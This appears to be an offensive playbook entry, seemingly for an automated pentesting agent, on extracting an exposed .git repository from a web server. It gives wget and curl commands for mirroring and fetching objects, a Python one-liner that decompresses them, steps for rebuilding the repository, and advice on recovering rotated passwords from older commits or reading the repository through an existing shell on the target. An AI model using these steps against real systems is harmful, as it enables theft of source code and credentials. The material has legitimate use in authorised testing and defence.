---
id: git-leak
title: Exposed .git repository → full extraction via object-walk
triggers: [.git/, .git/logs, git-dumper, index of /.git, refs/heads]
---

# Exposed .git without git-dumper (NOT installed)

Mirror it with `wget -r -np -nH --cut-dirs=N http://IP/.git/ -P out/`
(cut-dirs = path depth). Manual object-fetching needs `mkdir -p` for EVERY
parent dir first — `curl -o .git/refs/heads/master` dies with exit 23 when
`.git/refs/heads/` doesn't exist locally. A saved Apache 404 page is NOT a
ref — `.git/refs/heads/master` returning 404 means there are no commits
(dead end), don't re-fetch it.

`wget -r` CANNOT enumerate `objects/` (no HTML index) — mirrors stay
incomplete. Walk objects by hash instead (this is what git-dumper does):

1. `curl http://IP/.git/logs/HEAD` → commit shas oldest→newest
2. fetch `.git/objects/<first2>/<rest38>` raw → zlib-decompress:

   ```bash
   curl -s "http://IP/.git/objects/84/642e62…" | python3 -c \
     "import sys,zlib;sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))"
   ```

3. `commit` object → `tree <sha>` → tree object lists `mode sha name`
   per entry (binary!) → fetch blobs → file contents
4. cleaner: drop objects into a local `/tmp/repo/.git/objects/xx/`
   layout (mkdir -p first) + fetch HEAD/refs/config → then ordinary
   `git -C /tmp/repo log` / `git cat-file -p <sha>` work offline

## Rotated secrets

When a commit message says creds/config changed ("rotate creds before
go-live"), diff the file ACROSS commits — the old value lives in the
older blob (password archaeology, not the current tree):

```bash
git -C /tmp/repo log -p -- config.yml   # old blob carries old password
```

## Faster when you already have a shell

A proven shell on the TARGET is also a forensic tool — if git exists
there, `ssh host 'git -C /var/www/app log -p'` or
`git show <sha>:<file>` beats 40 remote object fetches. Only mirror
when the repo is NOT readable through an existing shell.
